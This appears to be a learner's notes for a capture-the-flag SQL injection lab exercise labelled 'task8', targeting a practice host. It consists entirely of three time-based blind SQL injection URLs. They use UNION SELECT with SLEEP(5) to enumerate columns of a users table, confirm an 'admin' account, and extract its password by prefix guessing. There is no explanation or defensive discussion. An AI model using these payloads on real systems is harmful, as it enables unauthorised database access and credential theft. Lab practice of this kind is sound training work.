task8
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME = 'id' and COLUMN_NAME != 'password' and COLUMN_NAME != 'username';--


https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),3 FROM sqli_four.users WHERE username like 'admin';

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),3 FROM sqli_four.users WHERE username like 'admin' and password like '4961%';
```